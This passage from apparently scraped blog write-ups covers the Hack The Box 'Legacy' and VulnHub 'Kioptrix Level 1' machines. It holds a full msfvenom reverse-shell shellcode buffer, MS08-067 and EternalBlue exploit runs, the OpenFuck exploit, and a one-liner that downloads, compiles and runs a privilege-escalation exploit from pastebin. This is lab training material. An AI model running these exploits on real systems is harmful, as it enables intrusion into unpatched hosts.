\u0026lt;DIR\u0026gt; . 16/03/2017 09:19 �� \u0026lt;DIR\u0026gt; .. 16/03/2017 09:19 �� 32 user.txt 1 File(s) 32 bytes 2 Dir(s) 6.312.239.104 bytes free   Root flag Similarly Admin flag found under Administrator Desktop\nC:\\Documents and Settings\\Administrator\\Desktop\\root.txt\n1 2 3 4 5 6 7 8 9 10 11  Directory of C:\\Documents and Settings\\Administrator\\Desktop 16/03/2017 09:18 �� \u0026lt;DIR\u0026gt; . 16/03/2017 09:18 �� \u0026lt;DIR\u0026gt; .. 16/03/2017 09:18 �� 32 root.txt 1 File(s) 32 bytes 2 Dir(s) 6.296.653.824 bytes free C:\\Documents and Settings\\Administrator\\Desktop\u0026gt;type root.txt type root.txt 99344----------------------e695d5713   Manual Exploitation There are multiple MS08-67 exploits available on the internet but the one which worked the best for me is Jivoi \nTo make this python script work we just have to replace the default given Shellcode with our own Shellcode. generation command via msfvenom for different payload style is already given in comments by the author inside the script.\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.102 LPORT=443 EXITFUNC=thread -b \u0026quot;x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\u0026quot; -f c -a x86 --platform windows\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  ┌─[atom@atom-vmwarevirtualplatform]─[~] └──_ $msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.102 LPORT=443 EXITFUNC=thread -b \u0026#34;x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\u0026#34; -f c -a x86 --platform windows Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai failed with A valid opcode permutation could not be found. Attempting to encode payload with 1 iterations of generic/none generic/none failed with Encoding failed due to a bad character (index=55, char=0x78) Attempting to encode payload with 1 iterations of x86/call4_dword_xor x86/call4_dword_xor succeeded with size 348 (iteration=0) x86/call4_dword_xor chosen with final size 348 Payload size: 348 bytes Final size of c file: 1488 bytes unsigned char buf[] = \u0026#34;\\x29\\xc9\\x83\\xe9\\xaf\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\\x76\\x0e\u0026#34; \u0026#34;\\x80\\x88\\xaa\\xc1\\x83\\xee\\xfc\\xe2\\xf4\\x7c\\x60\\x28\\xc1\\x80\\x88\u0026#34; \u0026#34;\\xca\\x48\\x65\\xb9\\x6a\\xa5\\x0b\\xd8\\x9a\\x4a\\xd2\\x84\\x21\\x93\\x94\u0026#34; \u0026#34;\\x03\\xd8\\xe9\\x8f\\x3f\\xe0\\xe7\\xb1\\x77\\x06\\xfd\\xe1\\xf4\\xa8\\xed\u0026#34; \u0026#34;\\xa0\\x49\\x65\\xcc\\x81\\x4f\\x48\\x33\\xd2\\xdf\\x21\\x93\\x90\\x03\\xe0\u0026#34; \u0026#34;\\xfd\\x0b\\xc4\\xbb\\xb9\\x63\\xc0\\xab\\x10\\xd1\\x03\\xf3\\xe1\\x81\\x5b\u0026#34; \u0026#34;\\x21\\x88\\x98\\x6b\\x90\\x88\\x0b\\xbc\\x21\\xc0\\x56\\xb9\\x55\\x6d\\x41\u0026#34; \u0026#34;\\x47\\xa7\\xc0\\x47\\xb0\\x4a\\xb4\\x76\\x8b\\xd7\\x39\\xbb\\xf5\\x8e\\xb4\u0026#34; \u0026#34;\\x64\\xd0\\x21\\x99\\xa4\\x89\\x79\\xa7\\x0b\\x84\\xe1\\x4a\\xd8\\x94\\xab\u0026#34; \u0026#34;\\x12\\x0b\\x8c\\x21\\xc0\\x50\\x01\\xee\\xe5\\xa4\\xd3\\xf1\\xa0\\xd9\\xd2\u0026#34; \u0026#34;\\xfb\\x3e\\x60\\xd7\\xf5\\x9b\\x0b\\x9a\\x41\\x4c\\xdd\\xe0\\x99\\xf3\\x80\u0026#34; \u0026#34;\\x88\\xc2\\xb6\\xf3\\xba\\xf5\\x95\\xe8\\xc4\\xdd\\xe7\\x87\\x77\\x7f\\x79\u0026#34; \u0026#34;\\x10\\x89\\xaa\\xc1\\xa9\\x4c\\xfe\\x91\\xe8\\xa1\\x2a\\xaa\\x80\\x77\\x7f\u0026#34; \u0026#34;\\x91\\xd0\\xd8\\xfa\\x81\\xd0\\xc8\\xfa\\xa9\\x6a\\x87\\x75\\x21\\x7f\\x5d\u0026#34; \u0026#34;\\x3d\\xab\\x85\\xe0\\xa0\\xcb\\x8e\\xee\\xc2\\xc3\\x80\\x89\\x11\\x48\\x66\u0026#34; \u0026#34;\\xe2\\xba\\x97\\xd7\\xe0\\x33\\x64\\xf4\\xe9\\x55\\x14\\x05\\x48\\xde\\xcd\u0026#34; \u0026#34;\\x7f\\xc6\\xa2\\xb4\\x6c\\xe0\\x5a\\x74\\x22\\xde\\x55\\x14\\xe8\\xeb\\xc7\u0026#34; \u0026#34;\\xa5\\x80\\x01\\x49\\x96\\xd7\\xdf\\x9b\\x37\\xea\\x9a\\xf3\\x97\\x62\\x75\u0026#34; \u0026#34;\\xcc\\x06\\xc4\\xac\\x96\\xc0\\x81\\x05\\xee\\xe5\\x90\\x4e\\xaa\\x85\\xd4\u0026#34; \u0026#34;\\xd8\\xfc\\x97\\xd6\\xce\\xfc\\x8f\\xd6\\xde\\xf9\\x97\\xe8\\xf1\\x66\\xfe\u0026#34; \u0026#34;\\x06\\x77\\x7f\\x48\\x60\\xc6\\xfc\\x87\\x7f\\xb8\\xc2\\xc9\\x07\\x95\\xca\u0026#34; \u0026#34;\\x3e\\x55\\x33\\x4a\\xdc\\xaa\\x82\\xc2\\x67\\x15\\x35\\x37\\x3e\\x55\\xb4\u0026#34; \u0026#34;\\xac\\xbd\\x8a\\x08\\x51\\x21\\xf5\\x8d\\x11\\x86\\x93\\xfa\\xc5\\xab\\x80\u0026#34; \u0026#34;\\xdb\\x55\\x14\u0026#34;;   Once you change the shellcode value, lessen on port 443 and execute python code\npython3 ms08-067.py 10.129.145.24 6 445 \n\u0026ndash;\u0026gt;ms08-067.py Is our python payload\n\u0026ndash;\u0026gt;10.129.145.24 Ware target ip\n\u0026ndash;\u0026gt;6 Os of target user which we have found on metasploit exploit\n\u0026ndash;\u0026gt;445 Target port\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  $ Here\u0026#39;s how to upgrade if necessary: │┌─[atom@atom-vmwarevirtualplatform]─[~] $ │└──_ $nc -lvnp 443 $ git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impac│Can\u0026#39;t grab 0.0.0.0:443 with bind : Permission denied ket/ │┌─[_]─[atom@atom-vmwarevirtualplatform]─[~] $ cd impacket │└──_ $sudo nc -lvnp 443 $ pip install . │[sudo] password for atom: │listening on [any] 443 ... │connect to [10.10.14.102] from (UNKNOWN) [10.129.145.24] 1034 ####################################################################### │Microsoft Windows XP [Version 5.1.2600] │(C) Copyright 1985-2001 Microsoft Corp. Windows XP SP3 English (NX) │ │C:\\WINDOWS\\system3\u0026gt; [-]Initiating connection │ [-]connected to ncacn_np:10.129.145.24[\\pipe\\browser] │ Exploit finish │ │ ┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/legacy] │ └──_ $python3 ms08-067.py 10.129.145.24 6 445 │ ####################################################################### │ # MS08-067 Exploit │ # This is a modified verion of Debasis Mohanty\u0026#39;s code (https://www.exploit-db.com/exploits│ /7132/). │ # The return addresses and the ROP parts are ported from metasploit module exploit/windows│ /smb/ms08_067_netapi │ # │ # Mod in 2018 by Andy Acer │ # - Added support for selecting a target port at the command line. │ # - Changed library calls to allow for establishing a NetBIOS session for SMB transport │ # - Changed shellcode handling to allow for variable length shellcode. │ ####################################################################### │ │ │ $ This version requires the Python Impacket library version to 0_9_17 or newer. │ $ │ $ Here\u0026#39;s how to upgrade if necessary: │ $ │ $ git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impac│ ket/ │ $ cd impacket │ $ pip install . │ │ │ ####################################################################### │ │ Windows XP SP3 English (NX) │ │ [-]Initiating connection │ [-]connected to ncacn_np:10.129.145.24[\\pipe\\browser] │ Exploit finish │   Eternal Blue CVE-2017–0143 (MS17–010). The vulnerability we’ll be exploiting is called Eternal Blue. This vulnerability exploited Microsoft’s implementation of the Server Message Block (SMB) protocol.\nwhen i try to exploit it via Metasploit. my exploit ware succeed but i couldn\u0026rsquo;t get shell, i am happy to learn from you guys, let me know if any one succeed on getting metasploit shell on this machine for this vulnerability\r let\u0026rsquo;s start exploiting manual method\nDownload the exploit code from Github  execute by following method and make sure that you have python2 and impacket module installed on your computer.\nThis exploit code will not work on python2 without any modification, if you have installed both python2 and python3, you can install impacket module by using pip2 install impacket \r 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  ─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/legacy/MS17-010] │┌─[atom@atom-vmwarevirtualplatform]─[~] └──_ $ls │└──_ $nc -nlvp 4444 BUG.txt eternalromance_leak.py mysmb.pyc │listening on [any] 4444 ... checker.py eternalromance_poc2.py npp_control.py │connect to [10.10.14.102] from (UNKNOWN) [10.129.145.24] 1053 eternalblue_exploit7.py eternalromance_poc.py README.md │Microsoft Windows XP [Version 5.1.2600] eternalblue_exploit8.py eternalsynergy_leak.py send_and_execute.py │(C) Copyright 1985-2001 Microsoft Corp. eternalblue_poc.py eternalsynergy_poc.py shellcode │ eternalchampion_leak.py get-pip.py zzz_exploit.py │C:\\WINDOWS\\system32\u0026gt; eternalchampion_poc2.py infoleak_uninit.py │ eternalchampion_poc.py mysmb.py │ ┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines/legacy/MS17-010] │ └──_ $python send_and_execute.py 10.129.145.24 /home/atom/eternalblue.exe│ │ Trying to connect to 10.129.145.24:445 │ Target OS: Windows 5.1 │ Using named pipe: browser │ Groom packets │ attempt controlling next transaction on x86 │ success controlling one transaction │ modify parameter count to 0xffffffff to be able to write backward │ leak next transaction │ CONNECTION: 0x8612cc18 │ SESSION: 0xe11fcc18 │ FLINK: 0x7bd48 │ InData: 0x7ae28 │ MID: 0xa │ TRANS1: 0x78b50 │ TRANS2: 0x7ac90 │ modify transaction struct for arbitrary read/write │ make this SMB session to be SYSTEM │ current TOKEN addr: 0xe11333c8 │ userAndGroupCount: 0x3 │ userAndGroupsAddr: 0xe1133468 │ overwriting token UserAndGroups │ Sending file Q8M20F.exe... │ Opening SVCManager on 10.129.145.24..... │ Creating service qqPR..... │ Starting service qqPR..... │ The NETBIOS connection with the remote host timed out. │ Removing service qqPR..... │ ServiceExec Error on: 10.129.145.24 │ nca_s_proto_error │ Done │   See you on the next Blog, Happy hacking\u0026hellip;\r ","description":" Legacy from HackTheBox is an retired machine which is vulnerable to infamous MS08-067 \u0026 MS17-010 SMB vulnerabilities which can be easily exploited with publicly available scripts and Metasploit.","id":3,"section":"posts","tags":["samba","CVE-ID-2008-4250"],"title":"Hack The Box - Legacy ","uri":"https://fromzerotoonee.github.io/en/posts/legacy/"},{"content":"Mind Map  Info Table   Title Kioptrix - Level 1    Category VulnHub   OS Linux     Difficulty Easy   Maker Kioptrix   Reconnaissance Hi hackers Welcome Back Today we are going to look into vulnhub box which is Kioptrix-Level-1 , you can download this box using this link \nOpen VMware and import .vmx file into it, once you get imported , you can able to find login screen\nBefore getting started, we need to identify the ip address of vulnhub instance. from now let us consider attacker machine is our machine and target machine is koptrix machine. we can identify target machine ip address by using net discover,\nNet discover is a tool which discover network ip address automatically by searching private ip address of each class.\n1 2 3 4 5 6 7 8 9 10 11 12  netdiscover -r 192.168.132.0/24 Currently scanning: Finished! | Screen View: Unique Hosts 10 Captured ARP Req/Rep packets, from 4 hosts. Total size: 600 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.132.1 00:50:56:c0:00:08 7 420 VMware, Inc. 192.168.132.2 00:50:56:f7:dd:a3 1 60 VMware, Inc. 192.168.132.129 00:0c:29:7c:3a:16 1 60 VMware, Inc. 192.168.132.254 00:50:56:e9:00:db 1 60 VMware, Inc.   If we need to get into attacker system the thing we need to know about.\n 1 st target ip\n2 nd port\n3 rd service version\nIf the target service has vulnerable we can place our foot into target machine, already we know our target ip, let us find the opened port.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1] [9/9] └──_ $nmap -p0-65535 192.168.132.129 \u0026gt; aps.nmap ┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1] └──_ $cat aps.nmap Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-26 07:34 IST Nmap scan report for 192.168.132.129 Host is up (0.0037s latency). Not shown: 65530 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 139/tcp open netbios-ssn 443/tcp open https 32768/tcp open filenet-tms Nmap done: 1 IP address (1 host up) scanned in 16.46 seconds   Let us run service version scan on the opened ports.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  ┌─[_]─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1] └──_ $nmap -sV -p 22,80,111,139,443,32768 192.168.132.129 \u0026gt; svs.nmap ┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1] └──_ $cat svs.nmap Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-26 07:36 IST Nmap scan report for 192.168.132.129 Host is up (0.0011s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99) 80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) 111/tcp open rpcbind 2 (RPC #100000) 139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP) 443/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b 32768/tcp open status 1 (RPC #100024) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.44 seconds   Start attack on every vulnerable service\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52  └──╼ $nmap -sC 192.168.132.129 \u0026gt; dss.txt ┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1] └──╼ $cat dss.txt Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-25 21:23 IST Nmap scan report for 192.168.132.129 Host is up (0.0034s latency). Not shown: 994 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh | ssh-hostkey: | 1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1) | 1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA) |_ 1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA) |_sshv1: Server supports SSHv1 80/tcp open http |_http-title: Test Page for the Apache Web Server on Red Hat Linux | http-methods: |_ Potentially risky methods: TRACE 111/tcp open rpcbind | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 32768/tcp status |_ 100024 1 32770/udp status 139/tcp open netbios-ssn 443/tcp open https | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2009-09-26T09:32:06 |_Not valid after: 2010-09-26T09:32:06 |_ssl-date: 2022-05-25T15:55:59+00:00; +1m49s from scanner time. | sslv2: | SSLv2 supported | ciphers: | SSL2_RC4_128_WITH_MD5 | SSL2_RC2_128_CBC_EXPORT40_WITH_MD5 | SSL2_DES_192_EDE3_CBC_WITH_MD5 | SSL2_RC4_64_WITH_MD5 | SSL2_DES_64_CBC_WITH_MD5 | SSL2_RC4_128_EXPORT40_WITH_MD5 |_ SSL2_RC2_128_CBC_WITH_MD5 |_http-title: 400 Bad Request 32768/tcp open status Host script results: |_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) |_clock-skew: 1m48s |_smb2-time: Protocol negotiation failed (SMB2) Nmap done: 1 IP address (1 host up) scanned in 27.95 seconds ┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1] └──╼ $   Port 22 Start with port 22\n1 2  └──╼ $ssh root@192.168.132.129 Unable to negotiate with 192.168.132.129 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1   When i try to connect it says no matching method found, and it lists two algorithms, lets select any one algorithm and connect using the algorithm.\n1 2 3  ┌─[atom@atom-vmwarevirtualplatform]─[~/Desktop] └──╼ $ssh root@192.168.132.129 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 Unable to negotiate with 192.168.132.129 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc,rijndael128-cbc,rijndael192-cbc,rijndael256-cbc,rijndael-cbc@lysator.liu.se   Again we found no matching cipher found. we connect using any cypher which listed\n1 2 3 4 5  ┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~/Desktop] └──╼ $ssh root@192.168.132.129 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -c aes128-cbc The authenticity of host \u0026#39;192.168.132.129 (192.168.132.129)\u0026#39; can\u0026#39;t be established. RSA key fingerprint is SHA256:VDo/h/SG4A6H+WPH3LsQqw1jwjyseGYq9nLeRWPCY/A. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes   We can see that it asks password of the root account. i have brute-forced password but couldn’t able to crack\nPort 80,443 1 2 3 4 5 6 7 8 9 10 11 12  ┌─[atom@atom-vmwarevirtualplatform]─[~/Desktop] └──╼ $nmap -sV -p 80,443 192.168.132.129 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 21:15 IST Nmap scan report for 192.168.132.129 Host is up (0.00085s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) 443/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds   We can able to see the apache version. lets run nmap vuln scan which helps to find CVE if the target service is vulnerable\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  ┌─[atom@atom-vmwarevirtualplatform]─[~/Desktop] └──╼ $nmap -p 80,443 -sV --script vulners 192.168.132.129 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 21:14 IST Nmap scan report for 192.168.132.129 Host is up (0.00083s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) | vulners: | cpe:/a:apache:http_server:1.3.20: | MSF:ILITIES/LINUXRPM-RHSA-2010-0602/\t10.0\thttps://vulners.com/metasploit/MSF:ILITIES/LINUXRPM-RHSA-2010-0602/\t*EXPLOIT* | SSV:72403\t7.8\thttps://vulners.com/seebug/SSV:72403\t*EXPLOIT* | SSV:26043\t7.8\thttps://vulners.com/seebug/SSV:26043\t*EXPLOIT* | SSV:20899\t7.8\thttps://vulners.com/seebug/SSV:20899\t*EXPLOIT* | PACKETSTORM:126851\t7.8\thttps://vulners.com/packetstorm/PACKETSTORM:126851\t*EXPLOIT* | PACKETSTORM:123527\t7.8\thttps://vulners.com/packetstorm/PACKETSTORM:123527\t*EXPLOIT* | PACKETSTORM:122962\t7.8\thttps://vulners.com/packetstorm/PACKETSTORM:122962\t*EXPLOIT* | MSF:AUXILIARY/DOS/HTTP/APACHE_RANGE_DOS\t7.8\thttps://vulners.com/metasploit/MSF:AUXILIARY/DOS/HTTP/APACHE_RANGE_DOS\t*EXPLOIT* | EXPLOITPACK:186B5FCF5C57B52642E62C06BABC6F83\t7.8\thttps://vulners.com/exploitpack/EXPLOITPACK:186B5FCF5C57B52642E62C06BABC6F83\t*EXPLOIT* ... ... |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b 443/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.43 seconds   Manual Method We can see that there is a tons of exploit available, but we can see that there is no critical CVE. we got version from target system, now a days all exploits available on git hub We can refer GitHub weather any exploits available for this version\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  ┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub] └──╼ $git clone https://github.com/heltonWernik/OpenFuck.git Cloning into \u0026#39;OpenFuck\u0026#39;... remote: Enumerating objects: 26, done. remote: Total 26 (delta 0), reused 0 (delta 0), pack-reused 26 Receiving objects: 100% (26/26), 14.14 KiB | 761.00 KiB/s, done. Resolving deltas: 100% (6/6), done. ┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub] └──╼ $sudo apt-get install libssl-dev [sudo] password for atom: Reading package lists... Done Building dependency tree... Done Reading state information... Done libssl-dev is already the newest version (1.1.1n-0+deb11u2). 0 upgraded, 0 newly installed, 0 to remove and 61 not upgraded ─[✗]─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1/OpenFuck] └──╼ $gcc -o open OpenFuck.c -lcrypto ┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1/OpenFuck] └──╼ $chmod +x open   We have to find the offset value for target machine, we know our target machine is Red Hat machine , we can identify by booting logs and we already know the apache server version of target machine is apache 1.3.20 if we run our payload we can see that different types of offset based on different platform and OS\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  ┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1/OpenFuck] └──╼ $./open ******************************************************************* * OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* : Usage: ./open target box [port] [-c N] target - supported box eg: 0x00 box - hostname or IP address port - port for ssl connection -c open N connections. (use range 40-50 if u dont know) Supported OffSet: 0x00 - Caldera OpenLinux (apache-1.3.26) 0x01 - Cobalt Sun 6.0 (apache-1.3.12) 0x02 - Cobalt Sun 6.0 (apache-1.3.20) 0x03 - Cobalt Sun x (apache-1.3.26) 0x04 - Cobalt Sun x Fixed2 (apache-1.3.26) 0x05 - Conectiva 4 (apache-1.3.6) 0x06 - Conectiva 4.1 (apache-1.3.9) 0x07 - Conectiva 6 (apache-1.3.14) 0x08 - Conectiva 7 (apache-1.3.12) 0x09 - Conectiva 7 (apache-1.3.19) 0x0a - Conectiva 7/8 (apache-1.3.26) 0x0b - Conectiva 8 (apache-1.3.22) 0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1) ... 0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1) 0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1) 0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1 0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2 0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1) 0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1) 0x68 - RedHat Linux 7.1 (apache-1.3.22-src) 0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1) 0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1 0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2 0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6) 0x6d - RedHat Linux 7.2 (apache-1.3.24) 0x6e - RedHat Linux 7.2 (apache-1.3.26) ... Fuck to all guys who like use lamah ddos. Read SRC to have no surprise ┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1/OpenFuck]   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  ┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1/OpenFuck] └──╼ $./open 0x6b 192.168.132.129 -c 40 ******************************************************************* * OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* Connection... 40 of 40 Establishing SSL connection cipher: 0x4043808c ciphers: 0x80f8068 Ready to send shellcode Spawning shell... bash: no job control in this shell bash-2.05$ bash-2.05$ unset HISTFILE; cd /tmp; wget https://pastebin.com/raw/C7v25Xr9 -O ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; --23:15:45-- https://pastebin.com/raw/C7v25Xr9 =\u0026gt; `ptrace-kmod.c\u0026#39; Connecting to pastebin.com:443... connected! HTTP request sent, awaiting response... 200 OK Length: unspecified [text/plain] 0K ... @ 2.59 KB/s 23:15:49 (2.59 KB/s) - `ptrace-kmod.c\u0026#39; saved [4026] ptrace-kmod.c:183:1: warning: no newline at end of file [+] Attached to 1055 [+] Waiting for signal [+] Signal caught [+] Shellcode placed at 0x4001189d [+] Now wait for suid shell... whoami root hostname kioptrix.level1   We have used ./open 0x6b 192.168.132.129 -c 40 0x6b because if we look into CVE 2002-0082  for Red Hat Linux apache\nPort 111 Lets we look into next port 111\n1 2 3 4 5 6 7 8 9 10 11  Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-26 07:36 IST Nmap scan report for 192.168.132.129 Host is up (0.0011s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99) 80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) 111/tcp open rpcbind 2 (RPC #100000) 139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP) 443/tcp open ssl/https Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b 32768/tcp open status 1 (RPC #100024)   We can see that port 111 is an RPC\nWhat is RPC ?\nRemote Procedure Call (RPC) is a protocol that one program can use to request a service from a program located in another computer on a network without having to understand the network’s details. RPC helps to communicate processes resides on different systems connected over network\nI have tried some basic enumeration\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  ┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1] └──╼ $nmap -Pn --script rpcinfo.nse 192.168.132.129 -p 111 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 22:51 IST Nmap scan report for 192.168.132.129 Host is up (0.00068s latency). PORT STATE SERVICE 111/tcp open rpcbind | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 32768/tcp status |_ 100024 1 32768/udp status Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds   rpcinfo makes an RPC call to an RPC server and reports what it finds.\n1 2 3 4 5 6 7  ┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1] └──╼ $rpcinfo -p 192.168.132.129 program vers proto port service 100000 2 tcp 111 portmapper 100000 2 udp 111 portmapper 100024 1 udp 32768 status 100024 1 tcp 32768 status   rpcclient - tool for executing client side MS-RPC functions\n1 2 3 4  ┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1] └──╼ $rpcclient --user=\u0026#34;\u0026#34; --command=enumprivs -N 192.168.134.129 Cannot connect to server. Error was NT_STATUS_IO_TIMEOUT   looking for NFS share\n1 2 3  ┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1] └──╼ $showmount -e 192.168.132.129 clnt_create: RPC: Program not registered   nothing makes me interest on port 111 lets we move to next port.\nPort 139 - SMB NetBIOS stands for Network Basic Input Output System. It is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network. Software applications that run on a NetBIOS network locate and identify each other via their NetBIOS names. A NetBIOS name is up to 16 characters long and 